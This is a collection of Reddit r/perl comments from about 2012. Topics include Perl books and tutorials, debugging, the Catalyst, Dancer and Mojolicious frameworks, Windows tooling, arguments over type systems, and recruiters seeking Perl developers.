Come on, man. Even I can tell this is crummy advice... Edit: After reading mithaldu's post below, I realized my idiocy and downvoted myself haha
I've heard pretty good things about that book. Is it newbie accessible, or should I hold off buying it for a while?
Signing up now :)
Perl has a builtin debugger. Try: perl -d -E 'my @a = qw( a b c ); for my $t ( @a ) { say $t }'
In perl you can call methods without parens if you don't want to pass in any parameters. So the above is the same as: sub delegate_method { my $self = shift; my $delegate = $self-&gt;delegate(); return $delegate-&gt;method( @_ ); }
Nobody i'll be more happy to share with than someone making an effort to learn something new. :D
[Interesting...](http://6guts.wordpress.com/2012/07/20/the-rakudo-move-to-qast-progressing-nicely/) "we’re looking forward to targeting other VMs in the not too distant future also."
I develop using emacs, so to debug I do M-xperldb ... but it's just a convenience wrapper around perl -d. When you're in the debugger, type the letter 'h' for a quick summary of the options. You can type 'perldoc perldebug' on a command line for a tutorial on debugging. If you don't have a command line, you can find all the perldocuments at CPAN.org
I concur.
Oh yeah, they're good too. I have my preference for weakly typed scripting languages but fortunately we can all get along. Side note: it seems like where Python and Ruby don't have to explain themselves, Perl does for whatever reason. I tell people I'm doing a project in Python? "Neat." Perl? "Whoa, man, that's crazy."
I would go and buy Advanced Programming 2nd Edition by Simon Cozens, published by O Reilly (and not just because I got a very brief mention in it and drank beer with the author ;) Seriously - it's a great "cooks tour" of perl - covers almost all areas of perl dev in a little depth and witth pointers to find out more - some of it's a little dated in terms of specific cpan modules - but a great book.
I'd recommend reading "Modern Perl" before it. In general, read the newer good books first, then the older good books, for historical perspectives. Perl has moved on quite a bit since 2009.
Well, when I say I come from a C/C++ back ground, I don't mean I've professionally developed anything with C or C++. I mean a couple of years ago I tried picking up C as a first language (bad idea), fell of the wagon at pointers, tried learning C++ recently, realized it was way too big a language to be a true first, and finally decided to learn Perl. Anyway, thanks for the encouragement! It's always nice to hear you're doing well. Especially after seeing all those C/C++ null pointer exceptions pop up in CodeBlocks haha
Yeah, it's really just figuring out OAuth and the way Dropbox uses it. Keep your spirits high.
If you're on Windows, use Strawberry Perl instead.
For a *big* project I will continue to recommend Catalyst. It has a lot of really well-thought out features that let you take a big project in any direction you want. It's been in use for seven years, deployed in all sorts of situations, and it has the tests to show for it. Dancer is quicker to get started with and a pretty good choice for smaller apps, but a higher reliance on globals, singletons, and plugins, and the lack of anything to help you manage object lifetimes, makes it less awesome for big apps. Mojolicious has some really spiffy features, but they have a tendency to be tightly coupled to Mojo which is really annoying for us "CPAN is my language" folks who just want good, reusable modules that can be used with *any* framework.
&gt; If you sub foo($) {} you should be fine, yes? Everything depends on what you expect `foo` to do. That prototype has its own features....
I second that. Catalyst fits your description. 
Mojolicious++ You can still have as much of CPAN as you want, but Mojolicious isn't tied to it. This makes upgrades, testing and integration significantly easier. Mojolicious bug fixing turnaround is insanely great, but the core API is extremely reliable and stable these days. Mojolicious contains the core web framework parts and doesn't force you to use any particular model. While that is true of Catalyst in theory, in practice, if you're learning Catalyst and aren't using DBIx::Class "You're Gonna Have A Bad Time".
You're right. Qualified that little trick. Thanks. 
&gt; Is there any reason, beyond style, to: &gt; Always call your own functions with parens &gt; &gt; Always return from subs using an explicit return &gt; Where's the fun (&amp; economy) in that? Well, Perl already has enough fun to go around. :) Though, I put those in for style and consistency, and so I marked them as such (and also removed a bit of duplication). Thanks. 
Thanks for the suggestions, SciK. &gt; More like: &gt; &gt; open( my $fh, '&lt;', 'foo.txt' ) or die "Nooo!!!! $!"; &gt; &gt; while ( my $line = &lt;$fh&gt; ) { Ah, you're right, that's better. Also, I should've been using autodie in there. &gt; Why not: &gt; &gt; chomp(my @lines = slurp 'foo.txt'); I thought it looked better spread out. 
hi hobbs. Upvote for you.
Given as how none of the Catalyst apps I've ever written or maintained have used DBIx::Class^[*], I'm going to have to call bullshit. [\*]: Amusingly, I help *maintain* DBIx::Class; I just don't *use* it.
I have the 1st edition by Sriram Srinivasan. I've been looking through it, and it seems pretty informative. Will it suffice?
Thanks, I will grab a copy of that.
The big thing to be aware of is that perl5 has changed a lot since the publication of 'Learning Perl'; the basics are still valid, but some bad habits are on display there (such as the two-argument form of open, iirc). As others have noted, "Modern Perl" should be your second book to read; it'll go over some of the same ground, but you'll find a more up-to-date set of techniques. As for modules to use, take a look [here](https://www.socialtext.net/perl5/pbp_module_recommendation_commentary), but take everything with a grain of salt.
I learned Perl by taking the Perl classes at the [O'Reilly School of Technology.](http://www.oreillyschool.com/) I found that taking self-paced classes allowed the knowledge to sink in a lot better than reading a bunch of books. Don't get me wrong, I have lots of books on Perl and I find them very useful, but I find that OST's courses allowed me to get a more rounded knowledge of Perl than if I were to limit myself to just reading books.
Baby Steps dude
All I need is in HTMM::Mason. Edit: I've been downvoted to zero so I think I need to clarify. I don't develop large projects. For my small needs, I want a simple templating system. HTML::Mason does that. It has its problems, but what I suffer from those I gain back 10 times over from its simplicity.
I'd like to link this on perl-tutorial.org, but as it is, i could not recommend it. Primarily because strict and warnings are only a footnote, and not a big huge disclaimer up front before everything else. If you could have a read through [the guide on what a good tutorial covers](http://perl-tutorial.org/learn/), adapt a bit and let me know, i'd be very happy to link it. :D
https://metacpan.org/module/Tkx::Tutorial
Strawberry perl installs a tool chain and compiles non pure perl packages as needed. Active state pre compiles for you but only what they choose to provide. 
I think you're best off using GTK as it seems to be the least old and busty of your choices. I would start with using Glade which can output perl or lots of other languages and makes the UI design a bit easier, at least while starting out. Here is a 2010 article: http://www.linuxforu.com/2010/08/programming-using-glade-and-perl/ The last glade stuff I did was a test program to get myself back into C. It was functional and nice to stretch the C muscles, but then I dumped that and rewrote it for android. Tangentially, I wish app framework programs would adopt using css as their layout system, even though it's a piece of shit it would be neat to give users the css file and let them monkey with the layout if they don't like the defaults. It would also possibly give us a cross language, cross platform layout language, so we don't have to learn how to float shit to the left on android, then do it again on the PC, and again on the iphone.. 
Windows 
That list looks fairly comprehensive to me, as far as the language itself goes. Frameworks and APIs would result in a massive list that might not be very useful, so I think there'd be more value in keeping it short and focussed. It might be worth having some kind of beginner/intermediate/advanced stamp for the sidebar: there's a vast gulf between Learning Perl and Higher Order Perl.
Wow that sounds kind of cool. How would you break up the app ?with includes? I'm new to perl as well
I would add this book as well. * [Mastering Regular Expressions (Jeffrey E.F. Friedl)](http://shop.oreilly.com/product/9780596528126.do) Understanding Regexes is a major part to fully utilizing Perl.
Watch the "Mojocasts" video podcasts for a great introduction - there are 5 short episodes to get you started: http://mojocasts.com/e1 I have no affilication with them, just think it's a really nice system. With a little more motivation I would make some really nice stuff with it ;)
This one could do with a new edition, but it's still good.
I learned from perlop, perlfunc and [the rest](http://perldoc.perl.org/index-language.html).
False. ActivePerl provides (on 32-bit version) MinGW toolchain, also ActivePerl lets you use MSVC toolchain (you can use free Windows SDK or Visual C++ Express), some people (like me) may like this.
I wasn't really looking for a web framework, but more of a desktop application.
Yes, I have spent an hour trying to find out how to install GTK and I am going to move on to Wx. 
Please don't do this ineffectually and seldomly-curated on here, but instead please head over to http://perl-tutorial.org/ and add to the content there.
I see this happen with Perl modules that have c bindings. If the module is built off of sources that have been changed in the system that have been upgraded, then the module will no longer work. You basically have to reinstall the module so that the Magick.so is recompiled as well. Since cpan doesn't have an uninstall option you will have to remove it by hand. That is unless someone has a better way of dealing with this problem. If so I would love to hear it.
Reinstall magick from source. It should come with PerlMagick
Hmm... Do you think that might be the reason I'm having trouble installing packages? When I try to use 'cpan' at the command prompt, it works fine until the command tries to compile the package. At that stage, I receive an error message stating that I don't have a compiler installed. Crazy thing is I have gcc and g++ installed, and I use them both pretty regularly.
Well, man, I'm running 64-bit, so that might make a bit of difference (no pun intended). This is all pretty overwhelming for a newb like me... :/
That's the one :)
The answer I received on #perl-help was to use [local::lib](http://search.cpan.org/~apeiron/local-lib-1.008004/lib/local/lib.pm) because if you use cpan to install then you have unmanaged modules in system locations and use your package manager to install libraries to system locations (apt, yum, pacman, etc). While this doesn't really answer your question, I *do* think it is a better solution than installing 3rd party modules to a system location. That way your package manager can handle system libraries and you can manage your local::lib install.
I had a problem where I installed all my span modules to a system location then when I upgraded Perl couldn't find any of my libraries (since it was looking in perl-5.12 instead of perl-5.14). On my hosting server, when the host upgraded the OS from cent5 to cent6 perl couldn't find any of my libraries either, but it's a cPanel box, so they blamed me (even though the cPanel config changed). Both are reasons why I use local::lib now.
Try [App::pmuninstall](https://metacpan.org/module/App::pmuninstall) ;-)
That did the trick.
Would there be any kind of order to read all of those?
I just build Galileo in Mojolicious, which was my first MVC anything. Who knows if I've done it well or not, but you are welcome to look at my code. https://github.com/jberger/Galileo
Thanks.
While compiling the source may be easy, perlbrew is even easier. Easiest solution wins imo. You might also want to talk a bit about why you are doing this instead of using the system Perl. Most new people would probably just forsake that and go for the one installed with the system.
not really. The database level is loosely coupled. For the Definitive Guide to Catalyst we had written 3or 4 chapters before even looking at databases. 
How recent are they? Perl 5.10 I think. 
Time to upgrade from 5.6.1...
Simplicity, like beauty, is in the eye of the beholder: #!/usr/bin/env perl use Modern::Perl; use YAML; # for display only while (&lt;DATA&gt;) { /Cpu/ or next; my %stat = reverse /([\d\.]+)\%(\w\w)/g; say Dump \%stat; } __DATA__ Cpu(s): 29.4%us, 27.5%sy, 0.0%ni, 19.6%id, 0.0%wa, 0.0%hi, 23.5%si, 0.0%st Cpu(s): 39.6%us, 17.0%sy, 0.0%ni, 17.0%id, 0.0%wa, 0.0%hi, 26.4%si, 0.0%st Cpu(s): 46.2%us, 5.8%sy, 0.0%ni, 25.0%id, 1.9%wa, 0.0%hi, 21.2%si, 0.0%st edit: flussence caught a bug. Reverse the order of the regex captures so that the keys get used as keys.
I like this version :-) That "/Cpu/ or next;" early bailout construct is one of my favorites in my everyday perl. That global regex returning a hash seems like something OP would just get confused by but it's definitely elegant! I guess by simplicity I meant the longhand version since it seems OP hasn't had a lot of exposure to regular expressions in perl.
&gt; Windows people don't have any decent greplike tools. That's not really true anymore. Recent versions of Windows come with [PowerShell](http://www.reddit.com/r/PowerShell/), which includes greppy things like Select-String. 
 my %stat = reverse /([\d\.]+)\%(\w\w)/g;
I did not know that. Thanks. ... So I'm now looking at http://technet.microsoft.com/en-us/library/ee176956.aspx and they want people to use Get-Content c:\scripts\test.txt | Select-String "Failed" -quiet -casesensitive instead of grep -i Failed c:\scripts\text.txt That's pretty long and involved to put in a script, and even worse if you have to type it at the shell. Windows users are still a long way away from having something as good as grep or ack. 
Yeah. I find that Powershell has some great ideas, and it's good for scripting, but it is very verbose and leaves a lot to be desired as an interactive shell. It's designed I think with the idea of writing scripts, 'but who really wants to type commands vs using the GUI'? (I do! But I'm not a Windows fan and therefore outside their demographic I guess). We use Windows a lot at work :( and so I've been disciplining myself to use Powershell as much as possible. I often break down and open Cygwin bash/mintty to get something done fast. Jesus Christ Windows fucking sucks donkey dick. I finally got an Ubuntu workstation and I'm as happy as a clam. 
We can still all agree that Linux and BSD are most comfy, right ? :)
oops. Good catch!
No, comments like this don't get it. Don't shit on windows people. Don't make them feel bad for wanting to use Perl. Be glad they chose to use the same language as you and try to make them comfortable with it. Once they ARE comfortable with Perl and like it, you can guide them in private towards cool linux stuff. But doing it before that, with comments like this, in public, you're just pushing them away.
&gt; Jesus Christ Windows fucking sucks donkey dick. Good luck in your quest of making sure windows users will stick to python when learning new languages!
&gt; That said, I understand and agree with the point that we're more likely to get converts if we don't make digs on other OSes. Thank you for pointing it out. Thanks. :) &gt; I don't think anyone's going to take my hating Windows It's not that, the "It's horrible." part was. As i said: "Hating windows is fine. Everyone has preferences." &gt; I didn't much like it You should try again sometime. I usually don't even use the cygwin bash shell. I just call whatever gnu tool i need from the normal windows cmd prompt and it works just like you'd expect from a linux shell. :)
Windows is one of those OS's that the more I learn about quirks in its API the less I like it. The way I would characterize it is that every release brings forth a host of new features which are sorely needed. The only problem is that the healthy dose of NIH has kept the teams from actually learning from their competition. Indeed, now Windows is off to a try to replicate GNOME 3's success.... A second thing is that many Windows users are scared of computers because of bad Windows experiences. This being said, there is a tremendous potential for Perl software on Windows. I don't have to like the platform to accept that there are valid reasons for supporting the platform.
&gt; Windows is off to a try to replicate GNOME 3's success &gt; Windows users are scared of computers because of bad Windows experiences. You have an amazing reality distortion field going on that rival's Steve Jobs'.
I have no background, I have played around with other languages but perl is really my first.
-&gt; the closest thing i've ever found to information on whats inside amazon - http://highscalability.com/amazon-architecture/
Dadamail and Octopussy are also pretty good. Not all that well known though. Foswiki (was Twiki) and Sympa. BackupPC is a nice one. 
Even if people aren't doing it directly, trying to claim that your OS is better means that you're trying to claim their OS is worse; and as such that the choice of the other people is wrong. It is an indirect attack. You may have a tough skin and that's good for you, but don't expect everyone else to be like you.
I should have thought of asking this on SO before posting, but I hope this information helps any future developers. http://stackoverflow.com/a/11851216/974157 Windows adds extra bits to the file that have to be watched out for.
Thanks for the tips. I added a big red "use strict; use warnings" near the top of the document. An aside though, I'm not sure how useful the document is as a tutorial, per se. As I mention in the first paragraph, it's for those who've been away from Perl 5 for a while, and who are rusty and want to get back into the swing of things. If it were a real tutorial, it would probably be longer, rather than a high-speed pass over a lot of bullet-points. :) 
Java is like the car ride at Disneyland. You can turn the car all you like but once you hit the middle divider that's as far as it will go. 
Perl is not an interpreted language (neither is Python, nor Ruby). For an example of an interpreted language, try Tcl, sh, or dc. Or, if you want to choose a definition where Perl is an interpreted language, then so is Java.
&gt; I'm a Java/Eclipse developer We're sorry. &gt; assignment to maintain a bunch of Perl scripts. We're sorry. We are deeply sorry... http://youtu.be/rDqatJPvOfk?t=13s
The biggest thing bugging me right now is the move from a tightly integrated Java Eclipse environment full of tooling to ... vi and perl -d edit: I actually have also been trying out EPIC for Eclipse and am not so impressed thus far.
No craigslist? I haven't really looked for a job in a while, but I feel like that is still one of the tops sites I would check first.
booking.com
I realize I am being downvoted for my snarky response but I don't understand what hobbified is adding to the discussion by saying "you're wrong perl is not an interpreted language (neither is Python, nor Ruby)." I have encountered jackasses who do this shit "IRL", they make these kinds of statements that don't contribute to the discussion and then expect people to beg them to shine the light of their extrordinary knowledge and insight on them. Evilution84 tried to add to the discussion in a reasonable way, then hobbified replies with some pendatic hair splitting bs. idk maybe I am being trolled and don't see it yet. 
&gt; You're about to learn that type safety really isn't that important and the value of the flexibility and time savings that comes from eliminating it What. Sorry, just what. Yes, it's horrible knowing that two things at least have a very basic proof that they can fit together. How could this ever be beneficial to long term code maintainance? If Java is your only feel for a type system, then the problem is more that you just haven't used a good one. A compiled typed language with decent inference gives you as little typing as Perl, with drastically more security. Haskell is my choice, but there are plenty of others.
I am contributing to the discussion, and you live a sad life. And I'm not *stopping* Evilution84 from saying anything, just adding information. He's right, at least, that Bioperl is wildly popular, and that perl is ungodly slow at number crunching, and that PDL makes it better.
I read alot of stuff about how companies implement their backend processing and I marvel at the complex stacks that people build to do seemingly simple tasks. I used perl for web sites (including an intranet site to manage a sequencing lab), back end processing for trading systems and most recently for processing thumbnails from facebook feeds. It is so quick to develop stuff, it is easy to get spoiled. For bigger numerical processing there are packages for R and S. http://www.omegahat.org/RSPerl/
I've seen this posted and blogged about several places in the past (and firmly believe it myself), but anyone interested in finding "good" perl developers should take into account whether or not they are open to the option of telecommuting. Based on your username, you're looking for perl programmers in the bay area. As a recruiter I'm not sure if you already have a list of jobs you're looking to fill or if you're just looking to get some contacts that you can reference when these types of positions come up, but I can safely say you'll increase your pool of possibly applicants on all the sites you listed above if the option to telecommute is one the business is willing to consider.
Hey, well at least the food in Chicago is great (I lived there as a kid and went to college about 2 hours away). If I run into any Chicago-based people, I'll pass them on to you!
My company sponsored the conference as well this year, and had a booth at the job fair. I was only at the booth for half the time, but I can't say we found too many people while I was there. We don't have a particularly recognizable name, though, and we were stuck in the back room instead of up front.
&gt; ... if strong typing is a good thing then by your argument Java (and most other strongly typed languages) must be too weakly typed. That's true. &gt; It's for that reason that I say that typing doesn't really add any real benefits. Oh, I can imagine a good type system (that is, not Java) where you can prevent XSRF problems at the point of compilation.
One can "rightly" say alot of things, I was arguing that some say-able things don't add to a discussion and some things are convenient but technically not 100% correct. Any productive (or pleasant) conversation can be ground to a halt by pendantry. I linked to a moderately detailed discussion of the issue in another comment. Someone should correct wikipedia because they say "interpreter". 
Oh how I loathe bioperl. It's so slow. I rewrote the last bioinformatics guy's code using no modules... Can't even tell you how much faster it is now... I really do need to get to using PDL, just haven't. Really my biggest problems are with memory usage and multi-dimensional hashes. 
What are the typical salary for such a job? SF Area, experienced Perl developer. (I'm one, but not in that area.) Edit: Just trying to gauge if it is worth relocating...
Exactly this. I'm good enough that I can choose my jobs, and I'm not going to relocate. Of course, moving isn't even an option because I can't sell my house without losing money anyhow.
I'm an interested, available developer. The market for tech jobs is drying up where I live, and I can't afford to relocate, especially not somewhere like san francisco. I don't have the "years of experience" thing either. I'm zpmorgan on github &amp; cpan, and my resume is here: https://github.com/zpmorgan/resume/blob/master/resume.pdf?raw=true
Wow thank you for all the info. So the pad lists are per sub, and the memory really is allocated but it can be re-used by subsequent calls to the same sub. The recursive routine which prompted this investigation was a tree traversal sub, and based upon the above it seems that the memory used is bound roughly by the size of the tree * depth of the tree. I'm fairly certain all the trees are of reasonable size, but I'll confirm the pad lists are of reasonable size tomorrow by measuring what Devel::Size says about all the hits reported by leaktrace{}. Based upon your first paragraph, non recursive subs don't have pad lists, so I could re-write the routine so it isn't recursive and only use the extra mem when traversing the tree and get it back afterwards.
Does the job need deep knowledge of Perl, or intermediate level? Any software engineer can learn Perl. You could find someone without Perl experience, especially a recent graduate with a decent/good transcript who is looking for work, and give them a beginner and intermediate Perl book. A diligent student can become intermediate in Perl in 2-4 40 hour study-weeks.
Oh, and just in case you weren't aware, dependent types take things into another level of safety. Type safety is not just about preventing null pointer exceptions (excuse me if I come across as condescending, I don't know how much you've played with type systems that are, for lack of better explanation, more "academic"). Dependent types allow us to guarantee things such as we don't read from a closed file handle, or that we don't access indexes outside the bounds of a vector, or that we don't try and change a database without being inside a transaction. There's an awful lot of power here. I will agree, you write stuff slower in strongly typed languages. The difference is that you ultimately spend more time writing new things, and less time fixing old things.
Not long ago, I wrote a long post on a similar topic -- the lack of Perl programmers and difficulties of hiring them: http://www.reddit.com/r/perl/comments/vs2xs/where_do_new_programmers_come_from/c57iblm Please do go read that. Cripes, it's one of the few write-ups I've done that hasn't been downvoted to oblivion. I posted a reply to a ask reddit about whether anyone heard anything bad about how the Olympics were run, and I listed what I heard. Looking at that now, I got pummeled to -38. My gigs have generally been through regulars at Phoenix.PM (though I'd often repost jobs for recruiters who emailed me and asked me to, while I was in charge of the group) or through jobs.perl.org, but mostly through jobs.perl.org. Real Perl jobs on Dice are kind of a needle in a haystack so I don't really bother looking there except to convince myself that that's still the case. It's hard to lure Perl programmers away from one gig, even if you're offering a lot more money. Because of the small teams (often alone) Perl programmers work on, I think they feel like they're abandoning their employer and their code if they leave, and for whatever reason, they just have a stronger sense of loyalty. Posting jobs anywhere may not be an effective recruiting mechanism. If you're feeling ambitious, you might stalk CPAN module authors on http://search.cpan.org and http://github.com and recruit them more actively. Or people might find that to be in bad taste. I guess that ties in to the first people: no one minds hearing about the right opportunity. If you can offer the extremely talented programmers the right perks, that may just be a winning deal for everyone.
We are hiring them here in Houston too ;)
Here is the post where Tom Christiansen talked about interpreted vs compiled: http://www.perl.com/doc/FMTEYEWTK/comp-vs-interp.html Long ago (early 90s?), I used a perl compiler (it compiled perl to a binary) - I don't think it was this one: http://www.perl-compiler.org/ but did it to speed things up for one perl script since we didn't have time to do the optimizations in perl. It worked well but is not recommended (afaik) or necessary. 
&gt; Perl 5's default object system is flexible, but minimal. You can build great things on top of it, but it provides little assistance for some basic tasks. Moose is a complete object system for Perl 5. http://jjnapiorkowski.typepad.com/modern-perl/2009/05/top-ten-great-things-about-perl-moose-postmodern-object-system.html http://perldoc.perl.org/perlootut.html
There are frequent Perl jobs in the UK, also in Utah and Texas. Keep in mind that not all US states are hot beds for IT jobs. If you want a real "work anywhere" career, you should become a barber :)
Can you import? I've getting on for 30 years experience in general (I started young!), perl since the mid 90's, and working in the US is something I'd like to do. There are some good perl shops in LA, even in Santa Monica and these are very appealing. Not sure real estate prices in SF are that attractive though! You seem to be doing all the right things for networking. Maybe go sideways to other groups that might use perl incidentally such as bioinformatics, hudson/jenkins folks, sysadmins and so on? 
Nothing about YAPC::NA really costs lots. The tables are often provided to sponsors because that's basically why they sponsor ... To have access to recruit people and raise their profile in the community.
&gt; Dependent types allow us to guarantee things such as we don't read from a closed file handle, or that we don't access indexes outside the bounds of a vector, or that we don't try and change a database without being inside a transaction. Strong types don't do any of these things. Most of the cases you describe here are exception situations that typing has nothing to do with. A dependent type will throw an exception, but then again most other languages will do the same regardless of typing. The database transaction piece is absolutely absurd. I've never come across a language that didn't allow you to perform a database change outside of a transaction. Then again I don't do functional programming for the same reasons I don't do things like self-mutilation and XHTML.
Without sounding too cruel, good luck with that, then. I'm sure you've noticed by now, but in the Perl world, there are scads of people that are at the "I've used perl! Hire me!" skill level, about 10 at the intermediate level, and the rest of us are pretty damn good. You usually don't want to hire the entry-level guys, the intermediate guys ... maybe, and the experienced guys, well, we're pretty darn happy located right where we are, and why *can't* we telecommute? I know you're a recruiter, and your job is to fill the company's requirements, but you might want to stress to your client how difficult it will be to find local talent and how they might want to consider telecommuting. And, for what it's worth, the "mostly telecommute" positions are self-defeating. When I look for work, I tend to skip over them, as, to me, that reads, "We don't trust technology and must waste time in face-to-face meetings *and* waste your time on a plane getting here for the above-mentioned time wasting."
I do attend meetups regularly, and so do all the other recruiters and account executives here. The hardest is that we're in Silicon Valley so we have to pick and chose what is most useful to us in the short term, since there are dozens of meetups a month; hitting all isn't a possibility. I attend various ones, sometimes with the idea of recruiting but most of the time to learn about a new technology or aspect of the industry. 
If the client doesn't want telecommute, we can't push it - think of it from their perspective as well. Hiring managers value teams that work well together, want to go out for beers have a big release, and hit up the local noodle house on lunch. Bringing in contractors for a short time doesn't work for the IT giants that have long-term, constantly updating products to maintain. Being in Silicon Valley, we can always find someone who wants to work in an office, even if it takes more time. These aren't one-off projects, but long term consulting/full-time opportunities at enterprise clients.
We don't sponsor visas. We're a boutique firm and about 95% of our business is in the SF bay area.
While I definitely agree that training is the way to go to fill many positions and get people in the workforce again (regardless of skills and industry), this is a mid-level role that is basically requiring a plug-and-play type of person with 50-75% of the required skills. Across the board, my firm works the jobs other companies can't fill, or people aren't applying to on their own. 
I've seen a variety, depending on location (San Francisco vs. Silicon Valley) and what /sort/ of development is being looked for. My current role is perl with scm tool development experience but we recently worked a perl with active directory role. It really fluctuates with the company, team, and budget, but on average I'd say a 8 year perl developer in Silicon Valley can command $115k+.
And one more also, I encourage McBride's lecture at http://www.cs.uoregon.edu/research/summerschool/summer10/video/OPLSS10-22-4.mp4 -- you only need to watch the first few minutes to see that type systems can produce well typed incorrect programs, but that is not evidence of their failure - it's evidence of a type system that isn't powerful enough!
&gt; So, yes they do. Sure, it might be a data structure that's doing the work, but type system is responsible for the proof of what is and is not possible. Since the structure is doing the work, I fail to see how this differs from any other exception. Then again, you have to be psychotic to enjoy functional programming. &gt; My point is absurd because you can't provide a counter example? I'm sorry, you may disagree, but at least base your arguments on some actual evidence. I think I have the null hypothesis here. It's up to you to come up with a language that requires a database transaction in order to perform some sort of change. &gt; Dependent types have nothing to do with exceptions, so I think we're talking about different things. I am talking about dependent types I understand that, however I don't see how they provide any benefit over an exception. Nearly all of the cases you site are handled as exceptions in any sane language. &gt; This is a little bit of a contradiction; you seem quite happy to engineer yourself more pain. You've obviously never spent any serious time building complex projects in a weakly typed language. I spend far less time diagnosing typing errors in a weakly typed environment than you spend adapting x into y. Oh, and since I loathe functional programming I get to use variables too. Finally, I would add that strong typing assumes that people who work with your code are incompetent. Weak typing assumes the people working with it have a clue. If you're hiring the former, that's your own problem.
&gt; I spend far less time diagnosing typing errors in a weakly typed environment than you spend adapting x into y. You're making two mistakes here: * assuming that a good type system requires lots of casting or adaptors * asserting that a weak type system (whatever "strong" or "weak" means) doesn't produce many type errors when it doesn't produce many type errors because it doesn't provide the capability to express type errors &gt; Weak typing assumes the people working with it have a clue. See also PHP. &gt; Then again, you have to be psychotic to enjoy functional programming. &gt; ... strong typing assumes that people who work with your code are incompetent. I don't think you're arguing in good faith.
Yes, the end client can, but my company brings consultants on as full-time employees of our company while they consult at client sites in the Bay Area. Visa sponsorship takes a lot of money and work, and carries a great risk. There are companies, though, that sponsor visas and find employment for consultants. Clients of ours like Cisco, eBay, PayPal, and Apple will transfer and hold a visa (and sponsor a green card) but only when the person becomes their employee. 
&gt; Since the structure is doing the work, I fail to see how this differs from any other exception. Then again, you have to be psychotic to enjoy functional programming. The point is that the combination of the structure *and* the type system means that I am declaring proofs about the behaviour of my program. With just the data structures I do not have any proofs of how they behave, nor a guarantee that I have composed things together in the correct way. Exceptions happen in well typed programs, of course - we can't expect to control user input and trust users. However, now that I've used types to guarantee that my program is assembled correctly, I can focus on handling user input exceptions. &gt; I think I have the null hypothesis here. It's up to you to come up with a language that requires a database transaction in order to perform some sort of change. As you wish, it's not much different from McBride's paper, here are just the type signatures. It's very naive, but I didn't see worth in giving you a full program in just a comment. If you'd like something executable, I'm happy to entertain that idea: newtype Transaction a = Transaction { transactionAction :: ReaderT DatabaseHandle IO a } newtype Atomic a = Atomic { atomicAction :: ReaderT DatabaseHandle IO a } class Database d instance Database Transaction instance Database OutsideTransaction insert :: Map ColumnName Value -&gt; Transaction () select :: Database d =&gt; Set Columns -&gt; d [Set Values] runTransaction :: Transaction a -&gt; Atomic a runDatabase :: DatabaseConnection -&gt; Atomic -&gt; IO () -- We can't do this, 'insert' produces a Transaction action, but runDatabase -- requires atomic actions invalid = runDatabase connection $ insert whatever -- This works, because 'runTransaction' produces an atomic action: valid = runDatabase connection $ runTransaction $ insert whatever Maybe this can be made prettier with GADTS, generalized algebraic datatypes, in Haskell, but this is enough to at least refute your hypothesis. &gt; I understand that, however I don't see how they provide any benefit over an exception. Nearly all of the cases you site are handled as exceptions in any sane language. My point is compile time over run time. Compile time forces my program to be sound before I even run it. Exceptions are great, if I've remembered to actually catch all exceptions and handled them sanely. And what's forcing me to do that? &gt; You've obviously never spent any serious time building complex projects in a weakly typed language. Oh right, https://github.com/metabrainz/musicbrainz-server/graphs/contributors - I guess those 3 years don't mean anything (I'm ocharles). It's not like I'm not experienced with functional either - https://github.com/ocharles/BookBrainz. &gt; Finally, I would add that strong typing assumes that people who work with your code are incompetent. Absolutely! I for one am extremely incompetent. So are you. So is Linus. Sure, we all rank differently on the scale of incompetence, but we're all humans, not machines. I want the machine to do as much as possible to make sure that I'm not a complete moron. It seems you have an irrational and emotional aversion to functional programming. I strongly urge you to reflect on that, take the emotion out, and give it a chance. It's not all-or-nothing, you can quite happily use functional paradigms in Perl. Minimizing state, higher order functions, pure functions, quick check - they are all fantastic tools and techniques, and I think you'd be foolish to discard them without learning them and practically applying them.
It was published recently, but if 5.12 is the newest version mentioned, it isn't too recent. Regardless, it was inspiring to hear Perl 6's progress. I was under a different impression. I think the meta-oo layer is fascinating, and provides a huge advantage over other oo languages. 
None of this I have control over. Yeah, it would be a lot easier and cheaper to have someone work remotely from wherever they live, but the reality is that many companies was a butt in a seat in a cubicle as fast as possible, for as long as possible and for as cheap at possible. My company would love to help people get out to the Bay Area, but the cost of a relocation, coupled with how that gets taken advantage of, is not worth it. People will jump ship for any reason (hence the at-will employment law) - investing in a new employee is a risk, so see where the employer is coming from. 
I'm not disagreeing. It goes both ways. No one is at fault, but it's one of the reasons that companies are hesitant to relocate people because there is no security. There are no "permanent" positions.
Excellent. I didn't mean to come off as curmudgeon-y as I likely did. The Bay Area has to be insanely more complicated for that stuff than Orlando which is still trying to build a startup / tech scene.
It's not a gui...it is visual.
Is this the kind of thing you are asking about? #!/usr/bin/env perl use warnings; use strict; use Data::Dumper; #make a list my @list = qw/ 1 2 3 4 5 6 7 8 9 10 /; # undef the evens for my $i (0 .. scalar(@list) - 1) { delete $list[$i] if $i % 2; } # show me the list print Dumper \@list; # turn all undefs into chr(0) my @new_list = map { $_ || chr(0) } @list; # show me the new list print Dumper \@new_list; Then when you run it: $ perl ./reddit.pl $VAR1 = [ '1', undef, '3', undef, '5', undef, '7', undef, '9' ]; $VAR1 = [ '1', '', '3', '', '5', '', '7', '', '9' ]; 
yep. that's better. although isn't it: my @new_list = map { defined($_) ? $_ : chr(0) } @list; I got too clever with my ||s ;-)
Cool! I believe the question has been edited. Originally OP wanted a 0 byte, but I reckon' they rethought it. Cheers!
I wasn't aware of that one, I've been using [regexr](http://gskinner.com/RegExr/) - downloadable via adobe air, or accessible online.
And in more recent Perl versions (since 5.11 I think?) @array = map { $_ // '' } @array;
Here's the video from YAPC::NA discussing it: https://www.youtube.com/watch?v=zcSFIUiMgAs&amp;feature=plcp
I think you want: defined or $_ = '' for (@list); Otherwise, Perl seems to parse the loop body as: (defined || $_) = '' which results in an error of "Can't modify logical or (||) in scalar assignment..."
5.10, or earlier if you apply the dor patch and recompile.
Emacs comes with [re-builder](http://emacs-fu.blogspot.com/2009/05/building-regular-expression.html#sec-1.3) for interactive regular expression writing, too.
Yeah, rxrx works fine locally. I'm not at the machine I was originally trying to `use` it on, but it's using mostly the same setup I have here (perlbrew 5.16.0). Looking at the source it seems to do something weird in `import` to detect when to run, so maybe I was trying to put the "`use Regexp::Debugger;`" line in the wrong places.
If I can rule out myself being an idiot when I get a chance next week I'll go file a bug.
